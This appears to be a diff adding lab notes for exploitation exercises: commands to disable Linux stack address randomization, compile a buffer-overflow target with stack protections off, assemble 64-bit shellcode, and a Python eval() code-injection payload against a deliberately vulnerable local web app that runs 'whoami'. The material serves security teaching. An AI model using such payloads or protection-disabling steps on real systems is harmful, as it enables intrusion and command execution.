@@ -1,0 +1,46 @@
+# Disable stack address randomization
+sudo -i
+echo 0 > /proc/sys/kernel/randomize_va_space
+
+# check stack address randomization status
+cat /proc/sys/kernel/randomize_va_space
+
+----------------------------------------------------------
+# I. How to execute shellcode exploits on 64-bit Linux OS
+
+# (1) shellcode [bfsucc4.c]
+gcc -o bfsucc4 -fno-stack-protector -z execstack bfsucc4.c
+
+# (2) sc64new.asm
+nasm -f elf64 -o sc64new.o sc64new.asm
+ld -o sc64new sc64new.o
+
+# run sc64new
+./sc64new
+
+# objdump
+objdump -d sc64new.o
+
+# gdb debugger
+gdb bfsucc4
+
+# compile getrsp
+gcc getrsp.c -o getrsp
+
+# calc real address (hex)
+## 0x7fffffffdd90 - 0x7fffffffdd50 = 40
+
+----------------------------------------------------------
+# II. Python Injection: eval()
+
+# clone repo
+git clone https://github.com/sethsec/PyCodeInjection.git
+
+# enter to folder
+cd PyCodeInjection/VulnAp
+
+# exec python 
+python PyCodeInjection
+
+# open browser and go to this URL
+http://localhost:8080/pyinject?param1=eval(compile("""__import__('os').popen(r'whoami').read()""",'','single'))
